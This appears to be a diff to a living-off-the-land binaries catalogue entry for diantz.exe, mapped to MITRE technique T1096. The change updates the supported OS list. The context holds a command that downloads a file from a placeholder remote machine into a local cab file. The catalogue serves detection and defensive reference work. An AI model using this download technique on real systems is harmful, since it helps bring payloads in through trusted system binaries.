@@ -11,7 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
-    OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.
+    OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019
   - Command: diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
     Description: Download and compress a remote file and store it in a cab file on local machine.
     Usecase: Download and compress into a cab file. 
